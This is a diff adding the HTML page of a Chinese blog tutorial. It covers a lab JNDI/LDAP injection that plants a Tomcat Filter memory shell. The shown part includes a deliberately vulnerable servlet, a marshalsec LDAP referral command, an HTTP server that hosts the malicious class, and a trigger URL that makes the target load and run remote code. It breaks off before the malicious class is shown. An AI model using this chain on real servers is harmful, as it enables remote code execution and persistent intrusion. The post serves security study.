@@ -1,0 +1,1208 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地 - blog</title>
+
+  
+    <meta name="description" content="原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地摘要本文记录了一次完整的JNDI注入内存马实验，从零开始搭建漏洞靶机环境，模拟攻击端通过LDAP协议远程加载恶意类，最终向目标Tomcat服务器动态注入Filter内存马实现命令执行。文章重点拆解了三个核心问题：恶意Filter对象的字节码传递方案、StandardContext的反射获取链路、以及Fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地">
+<meta property="og:url" content="https://wr0ld.github.io/posts/c3f7a2d9/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地摘要本文记录了一次完整的JNDI注入内存马实验，从零开始搭建漏洞靶机环境，模拟攻击端通过LDAP协议远程加载恶意类，最终向目标Tomcat服务器动态注入Filter内存马实现命令执行。文章重点拆解了三个核心问题：恶意Filter对象的字节码传递方案、StandardContext的反射获取链路、以及Fi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-22T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-22T13:05:38.781Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="JNDI">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="LDAP">
+<meta property="article:tag" content="Tomcat">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,JNDI,内存马,LDAP,Tomcat">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-22T12:00:00+08:00","dateModified":"2026-04-22T21:05:38+08:00","datePublished":"2026-04-22T12:00:00+08:00","description":"","headline":"原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/c3f7a2d9/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/c3f7a2d9/","keywords":"代码审计, Java, JNDI, 内存马, LDAP, Tomcat","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oEpmDiB2eAAEaIAgcFiEDKCAJAQgU8AVgzfKQA~tplv-dy-vqe2-sr-v2_1920_1205_q80.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-22T04:00:00.000Z">2026-04-22</time></span><span class="sep"></span><span class="text word-count">字数：19869</span><span class="sep"></span><span class="text img-count">图片：11</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="原理分析-JNDI注入内存马-——-ldap-Tomcat-Filter-无文件落地"><a href="#原理分析-JNDI注入内存马-——-ldap-Tomcat-Filter-无文件落地" class="headerlink" title="原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地"></a>原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>本文记录了一次完整的JNDI注入内存马实验，从零开始搭建漏洞靶机环境，模拟攻击端通过LDAP协议远程加载恶意类，最终向目标Tomcat服务器动态注入Filter内存马实现命令执行。文章重点拆解了三个核心问题：恶意Filter对象的字节码传递方案、StandardContext的反射获取链路、以及Filter动态注册的完整流程。</p>
+<p>前置阅读：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold">Filter内存马原理</a> | <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold">JNDI与Fastjson基础</a></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFjndi%E6%B3%A8%E5%85%A5">什么是JNDI注入</a></li>
+<li><a href="#%E5%89%8D%E6%8F%90%E8%A1%A5%E5%85%85lookup%E5%8F%82%E6%95%B0%E6%80%8E%E4%B9%88%E7%8E%A9">前提补充：lookup参数怎么玩</a></li>
+<li><a href="#%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%9C%8D%E5%8A%A1%E7%AB%AF">搭建漏洞服务端</a></li>
+<li><a href="#%E6%90%AD%E5%BB%BA%E6%94%BB%E5%87%BB%E7%AB%AF">搭建攻击端</a></li>
+<li><a href="#%E6%80%9D%E8%B7%AF%E6%8B%86%E8%A7%A3">思路拆解</a><ul>
+<li><a href="#%E9%97%AE%E9%A2%98%E4%B8%80%E6%81%B6%E6%84%8Ffilter%E6%80%8E%E4%B9%88%E4%BC%A0%E8%BF%87%E5%8E%BB">问题一：恶意Filter怎么传过去</a></li>
+<li><a href="#%E9%97%AE%E9%A2%98%E4%BA%8Cstandardcontext%E6%80%8E%E4%B9%88%E6%8B%BF">问题二：StandardContext怎么拿</a></li>
+<li><a href="#%E9%97%AE%E9%A2%98%E4%B8%89filter%E6%80%8E%E4%B9%88%E6%B3%A8%E5%86%8C">问题三：Filter怎么注册</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0">完整代码实现</a></li>
+<li><a href="#%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">打入内存马</a></li>
+<li><a href="#%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB%E6%96%B9%E6%A1%88">匿名内部类方案</a></li>
+<li><a href="#servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%98%E4%BD%93">Servlet内存马变体</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<hr>
+<h2 id="什么是JNDI注入"><a href="#什么是JNDI注入" class="headerlink" title="什么是JNDI注入"></a>什么是JNDI注入</h2><p>JNDI（Java Naming and Directory Interface）是Java提供的统一命名与目录服务API，底层可以对接RMI、LDAP、DNS等协议。</p>
+<p>核心入口类是 <code>InitialContext</code>，一个典型的存在漏洞的代码片段长这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">ctx.lookup(url);  <span class="comment">// url完全可控 → JNDI注入</span></span><br></pre></td></tr></table></figure>
+
+<p><code>lookup()</code> 的核心逻辑：如果查找到的是一个 <code>Reference</code> 对象，JNDI会从Reference指定的 <code>codebase</code> 地址远程加载类，并自动实例化。</p>
+<p><strong>这个”自动实例化”就是我们的入口</strong>——只要能控制 <code>lookup()</code> 的参数，就能让目标服务器加载并执行我们的恶意类。</p>
+<hr>
+<h2 id="前提补充：lookup参数怎么玩"><a href="#前提补充：lookup参数怎么玩" class="headerlink" title="前提补充：lookup参数怎么玩"></a>前提补充：lookup参数怎么玩</h2><p>在写代码之前，先把 <code>lookup()</code> 这个参数的完整流程搞清楚，这里涉及到一个经典工具 <strong>marshalsec</strong>。</p>
+<p><strong>被攻击服务器、攻击者的LDAP服务、攻击者的HTTP服务</strong>，三者之间的完整三角关系如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422115052594.png"></p>
+<p>简单说就是：</p>
+<ul>
+<li>被攻击服务器执行 <code>lookup(&quot;ldap://x/FilterInject&quot;)</code>，向LDAP服务发起查询</li>
+<li>LDAP服务（marshalsec）返回一个 <code>Reference</code> 对象，Reference里告知：**”去这个HTTP地址下载class”**</li>
+<li>被攻击服务器拿着地址去HTTP服务下载 <code>FilterInject.class</code>，下载完本地实例化，构造方法自动执行</li>
+</ul>
+<p>注意这里 <code>lookup</code> 里写的 <code>FilterInject</code> <strong>不是URL路径，而是LDAP里的一个查询key</strong>，marshalsec不在乎这个名字叫什么，统一返回同一个Reference。</p>
+<h3 id="marshalsec做的事情"><a href="#marshalsec做的事情" class="headerlink" title="marshalsec做的事情"></a>marshalsec做的事情</h3><p>用的这个命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8888/#FilterInject&quot;</span> 1099</span><br></pre></td></tr></table></figure>
+
+<p>marshalsec在这里扮演的角色就是<strong>那个LDAP服务</strong>，它做了两件事：</p>
+<ol>
+<li>在1099端口起一个LDAP服务，监听请求</li>
+<li>当有人来查询任意条目时，统一返回一个Reference，Reference里的codebase指向你给的HTTP地址</li>
+</ol>
+<p>所以 <code>http://127.0.0.1:8888/#FilterInject</code> 这个参数的含义是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/   → HTTP服务地址（python -m http.server起的那个）</span><br><span class="line">#FilterInject            → 要加载的类名</span><br></pre></td></tr></table></figure>
+
+<h3 id="需要起的服务一共两个"><a href="#需要起的服务一共两个" class="headerlink" title="需要起的服务一共两个"></a>需要起的服务一共两个</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个：python3 -m http.server 8888</span><br><span class="line">        作用：托管 FilterInject.class 文件</span><br><span class="line">        必须在 FilterInject.class 所在目录下启动</span><br><span class="line"></span><br><span class="line">第二个：java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \</span><br><span class="line">             &quot;http://127.0.0.1:8888/#FilterInject&quot; 1099</span><br><span class="line">        作用：LDAP服务，负责告诉被攻击方&quot;去哪里下载class&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://靶机/vuln?url=ldap://127.0.0.1:1099/FilterInject</span><br><span class="line">                      ↑LDAP服务地址和端口  ↑随便写，marshalsec不care这个名字</span><br><span class="line">                                            （重要的是marshalsec里配置的HTTP地址）</span><br></pre></td></tr></table></figure>
+
+<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ol>
+<li><strong>Reference对象的作用</strong>：JNDI协议支持返回 <code>javax.naming.Reference</code> 类型的对象，这个对象里可以指定一个外部URL地址，告诉JNDI客户端去那里加载类。</li>
+<li><strong>版本限制</strong>：这个攻击链需要目标服务器的JDK版本低于 <code>8u191</code>，Oracle在8u191之后将 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认设为 <code>false</code>，远程类加载就失效了，高版本需要配合反序列化链（如CC链）来绕过。</li>
+<li><strong>内存马注入原理</strong>：当服务器下载并实例化 <code>FilterInject.class</code> 时，类的构造方法会自动执行，利用这个特性可以在目标服务器上动态注册恶意Filter，实现内存马注入。</li>
+</ol>
+<hr>
+<h2 id="搭建漏洞服务端"><a href="#搭建漏洞服务端" class="headerlink" title="搭建漏洞服务端"></a>搭建漏洞服务端</h2><p>新建一个Maven Web项目，结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jndi_shell/</span><br><span class="line">├── src/main/java/com/vuln/</span><br><span class="line">│   └── JNDIServlet.java</span><br><span class="line">├── src/main/webapp/WEB-INF/</span><br><span class="line">│   └── web.xml</span><br><span class="line">└── pom.xml</span><br></pre></td></tr></table></figure>
+
+<p>直接创建maven的web骨架：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422100651505.png"></p>
+<p>pom.xml添加依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建目录和文件JNDIServlet，漏洞Servlet核心代码——关键是 <code>url</code> 参数完全来自用户输入，不做任何过滤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注解，将当前类标记为一个 Servlet，并指定其访问路径为 /vuln</span></span><br><span class="line"><span class="comment">// 访问 /vuln 时触发该 Servlet</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/vuln&quot;)</span></span><br><span class="line"><span class="comment">// 定义 Servlet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// 重写父类方法（因为是继承的父类，重写父类方法）</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 请求GET /vuln?url=xxx，则 url 的值为 xxx</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个 JNDI（Java命名和目录接口）的 InitialContext 对象</span></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="comment">// 调用 lookup 方法，该方法会根据传入的名称查找并返回 JNDI 中的绑定对象</span></span><br><span class="line">            ctx.lookup(url);  <span class="comment">// 漏洞点：参数可控</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            resp.getWriter().println(<span class="string">&quot;error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用Tomcat 9部署启动：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102518383.png"></p>
+<p>添加工件war exploded：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102448784.png"></p>
+<p>更改热加载模式：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102557150.png"></p>
+<p>启动后访问 <code>http://localhost:8080/</code> 返回正常即环境OK。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422102055137.png"></p>
+<hr>
+<h2 id="搭建攻击端"><a href="#搭建攻击端" class="headerlink" title="搭建攻击端"></a>搭建攻击端</h2><p>再新建一个独立Java项目作为攻击端，这里存放所有恶意类：</p>
